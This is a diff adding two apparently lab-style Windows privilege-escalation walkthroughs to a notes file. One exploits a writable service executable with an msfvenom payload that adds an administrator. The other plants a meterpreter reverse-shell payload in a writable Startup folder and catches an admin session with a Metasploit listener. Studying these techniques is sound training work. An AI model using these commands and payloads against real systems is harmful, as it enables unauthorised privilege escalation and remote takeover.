@@ -556,6 +556,111 @@
 
 - <details>
       <summary>Executable Files</summary>
+
+
+
+
+  
+  
+  Windows Privilege Escalation: Insecure Service File Permissions
+  ===============================================================
+  
+  This guide demonstrates a privilege escalation technique by exploiting a Windows service whose executable has weak file permissions. If a low-privileged user can overwrite the service's executable, they can replace it with a malicious payload. When the service is next started, the payload will execute with the high privileges of the service account, typically `NT AUTHORITY\SYSTEM`.
+  
+  🕵️‍♂️ Detection
+  ----------------
+  
+  First, we need to identify a service executable with insecure permissions that allows a standard user to modify or replace it.
+  
+  1.  Check File Permissions
+  
+      Open a command prompt on the Windows VM and use accesschk64.exe to inspect the permissions for the target service executable (filepermservice.exe).
+  
+      
+  
+      ```DOS
+      C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+  
+      ```
+  
+  2.  Identify the Vulnerability
+  
+      The output indicates that the Everyone user group has FILE_ALL_ACCESS permission on the filepermservice.exe file. This is a critical misconfiguration, as it means any user on the system can replace this executable.
+  
+  ⚙️ Prerequisite: Creating the Payload
+  -------------------------------------
+  
+  Before we can exploit this, we need to create a malicious executable (`x.exe`) that will perform our privileged action. We will use `msfvenom` on a Kali VM for this.
+  
+  1.  Generate the Payload
+  
+      On your Kali machine, run the following command to generate an executable that adds a standard user named user to the local administrators group.
+  
+      
+  
+      ```Bash
+      msfvenom -p windows/exec CMD="net localgroup administrators user /add" -f exe -o x.exe
+  
+      ```
+  
+  2.  Transfer the Payload
+  
+      Copy the newly generated x.exe from your Kali machine to a writable directory on the Windows VM, such as C:\Temp.
+  
+  💥 Exploitation
+  ---------------
+  
+  With the payload ready, we can now overwrite the original service executable and start the service to trigger our exploit.
+  
+  1.  Overwrite the Service Executable
+  
+      On the Windows VM, open a command prompt and use the copy command to replace the legitimate service executable with our malicious payload. The /y flag suppresses the overwrite confirmation prompt.
+  
+      
+  
+      ```DOS
+      copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+  
+      ```
+  
+  2.  Start the Service to Trigger the Exploit
+  
+      Now, start the service. Windows will execute our malicious payload with LocalSystem privileges.
+  
+      
+  
+      ```DOS
+      sc start filepermsvc
+  
+      ```
+  
+      The command embedded in our payload will now run, adding the `user` to the local administrators group.
+  
+  ✅ Verification
+  --------------
+  
+  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
+  
+  1.  Check Administrators Group
+  
+      In the same command prompt, type:
+  
+      
+  
+      ```DOS
+      net localgroup administrators
+  
+      ```
+  
+      You will now see the `user` account listed as a member of the group, confirming that you have successfully escalated privileges on the system.
+  
+  
+  
+
+
+
+
+
   </details>
 
 
@@ -602,7 +707,144 @@
 
 <details>
   <summary>Privilege Escalation - Startup Applications</summary>
+
+
+
+Windows Persistence & PrivEsc: Writable Startup Folder
+======================================================
+
+This guide demonstrates a persistence and potential privilege escalation technique by exploiting a globally writable "All Users" Startup folder. If a low-privileged user can place an executable in this folder, that program will automatically run whenever *any* user---including an administrator---logs into the system. This can be used to gain a shell with the privileges of the user who logs in next.
+
+🕵️‍♂️ Detection
+----------------
+
+First, we need to check the permissions of the `All Users` Startup folder to see if it's writable by our current user.
+
+1.  Check Folder Permissions
+
+    Open a command prompt on the Windows VM and use icacls.exe to inspect the permissions for the Startup folder.
+
+    
+
+    ```DOS
+    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+    ```
+
+2.  Identify the Vulnerability
+
+    In the output, look for the permissions granted to the BUILTIN\Users group. If it shows (F) for Full Access or (M) for Modify access, the folder is writable, and the system is vulnerable to this technique.
+
+💥 Exploitation
+---------------
+
+The exploitation process involves creating a reverse shell payload, placing it in the vulnerable Startup folder, and waiting for a privileged user to log in.
+
+### 1\. Setting Up the Listener & Payload (Kali VM)
+
+Use the Metasploit Framework on your Kali machine to create the payload and a listener to receive the connection.
+
+1.  **Start Metasploit**
+
+    
+
+    ```Bash
+    msfconsole
+
+    ```
+
+2.  Configure the Multi/Handler
+
+    This module will listen for the incoming connection from our payload.
+
+    
+
+    ```Ruby
+    msf6 > use multi/handler
+    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+    msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
+
+    ```
+
+3.  Start the Listener
+
+    The listener will now wait for a connection.
+
+    
+
+    ```Ruby
+    msf6 exploit(multi/handler) > run
+
+    ```
+
+4.  Generate the Malicious Payload
+
+    Open a new terminal window on your Kali VM. Use msfvenom to create a malicious .exe file.
+
+    
+
+    ```Bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your Kali VM IP Address> -f exe -o x.exe
+
+    ```
+
+5.  Transfer the Payload
+
+    Copy the newly generated x.exe file from your Kali VM to a temporary location on the Windows VM (e.g., the Desktop).
+
+### 2\. Planting the Payload (Windows VM)
+
+1.  On the Windows VM, move your payload into the vulnerable Startup folder.
+
+    
+
+    ```DOS
+    move C:\Users\User\Desktop\x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+    ```
+
+2.  To trigger the exploit, **log off** from the current user.
+
+3.  Now, **log in with an administrator account**. When the administrator's desktop loads, the `x.exe` file in the Startup folder will be automatically executed.
+
+✅ Gaining Access & Verification
+-------------------------------
+
+Return to your Metasploit terminal on the Kali VM. The payload will connect back to your listener.
+
+1.  Catch the Session
+
+    You will see a new Meterpreter session open. This session is running with the privileges of the administrator who just logged in.
+
+    ```
+    [*] Meterpreter session 1 opened (...)
+
+    ```
+
+2.  Verify Privileges
+
+    Interact with the new session and run the getuid command to confirm the user context.
+
+    
+
+    ```Ruby
+    meterpreter > getuid
+    Server username: User-PC\Admin
+
+    ```
+
+    The output confirms the payload is running as the `Admin` user, successfully capturing a privileged session.
+
+
+
+  
 </details>
+
+
+
+
+
+
 
 
 <details>
